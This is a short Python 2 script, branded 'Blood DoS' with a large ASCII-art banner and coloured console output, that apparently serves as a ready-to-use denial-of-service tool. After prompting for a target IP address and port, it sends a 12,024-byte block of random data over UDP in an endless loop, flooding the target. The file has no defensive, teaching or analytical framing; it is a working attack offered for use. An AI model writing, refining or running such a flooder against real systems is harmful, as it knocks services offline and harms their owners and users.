import socket



blood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

banner = """
                                                                                                                                                 
                                                                                                                                                 
BBBBBBBBBBBBBBBBB   lllllll                                   DDDDDDDDDDDDD             DDDDDDDDDDDDD                            SSSSSSSSSSSSSSS 
B::::::::::::::::B  l:::::l                                   D::::::::::::DDD          D::::::::::::DDD                       SS:::::::::::::::S
B::::::BBBBBB:::::B l:::::l                                   D:::::::::::::::DD        D:::::::::::::::DD                    S:::::SSSSSS::::::S
BB:::::B     B:::::Bl:::::l                                   DDD:::::DDDDD:::::D       DDD:::::DDDDD:::::D                   S:::::S     SSSSSSS
  B::::B     B:::::B l::::l    ooooooooooo      ooooooooooo     D:::::D    D:::::D        D:::::D    D:::::D    ooooooooooo   S:::::S            
  B::::B     B:::::B l::::l  oo:::::::::::oo  oo:::::::::::oo   D:::::D     D:::::D       D:::::D     D:::::D oo:::::::::::oo S:::::S            
  B::::BBBBBB:::::B  l::::l o:::::::::::::::oo:::::::::::::::o  D:::::D     D:::::D       D:::::D     D:::::Do:::::::::::::::o S::::SSSS         
  B:::::::::::::BB   l::::l o:::::ooooo:::::oo:::::ooooo:::::o  D:::::D     D:::::D       D:::::D     D:::::Do:::::ooooo:::::o  SS::::::SSSSS    
  B::::BBBBBB:::::B  l::::l o::::o     o::::oo::::o     o::::o  D:::::D     D:::::D       D:::::D     D:::::Do::::o     o::::o    SSS::::::::SS  
  B::::B     B:::::B l::::l o::::o     o::::oo::::o     o::::o  D:::::D     D:::::D       D:::::D     D:::::Do::::o     o::::o       SSSSSS::::S 
  B::::B     B:::::B l::::l o::::o     o::::oo::::o     o::::o  D:::::D     D:::::D       D:::::D     D:::::Do::::o     o::::o            S:::::S
  B::::B     B:::::B l::::l o::::o     o::::oo::::o     o::::o  D:::::D    D:::::D        D:::::D    D:::::D o::::o     o::::o            S:::::S
BB:::::BBBBBB::::::Bl::::::lo:::::ooooo:::::oo:::::ooooo:::::oDDD:::::DDDDD:::::D       DDD:::::DDDDD:::::D  o:::::ooooo:::::oSSSSSSS     S:::::S
B:::::::::::::::::B l::::::lo:::::::::::::::oo:::::::::::::::oD:::::::::::::::DD        D:::::::::::::::DD   o:::::::::::::::oS::::::SSSSSS:::::S
B::::::::::::::::B  l::::::l oo:::::::::::oo  oo:::::::::::oo D::::::::::::DDD          D::::::::::::DDD      oo:::::::::::oo S:::::::::::::::SS 
BBBBBBBBBBBBBBBBB   llllllll   ooooooooooo      ooooooooooo   DDDDDDDDDDDDD             DDDDDDDDDDDDD           ooooooooooo    SSSSSSSSSSSSSSS   
                                                                                                                                                 
                                                                                                                                                 
                                                                                                                                                 
                                                                                                                                                 
                                                                                                                                                 
                                                                                                                                                 
                                                                                                                                                 
"""

class renkler:
    PEMBE = '\033[95m'
    MAVI = '\033[94m'
    CAMGOBEGI = '\033[96m'
    YESIL = '\033[92m'
    SARI = '\033[93m'
    KIRMIZI = '\033[91m'
    DUZ = '\033[0m'
    KALIN = '\033[1m'
    ALTICIZILI = '\033[4m'

print(renkler.KIRMIZI + banner)

print(renkler.YESIL + "Welcome To Blood Dos :D\n[<Code>] Moduls Importing...")
import os
import random
import time
time.sleep(2)
print(renkler.YESIL + "[<Code>] Moduls Imported!")
ip = str(raw_input(renkler.CAMGOBEGI + "[+] Ip Adress: "))
port = int(input(renkler.SARI + "[+] Port: "))

bytes = random._urandom(12024)

print(renkler.KIRMIZI + "Attack Has Been Started. || Bytes: 12024")
while True:
    blood.sendto(bytes,(ip, port))
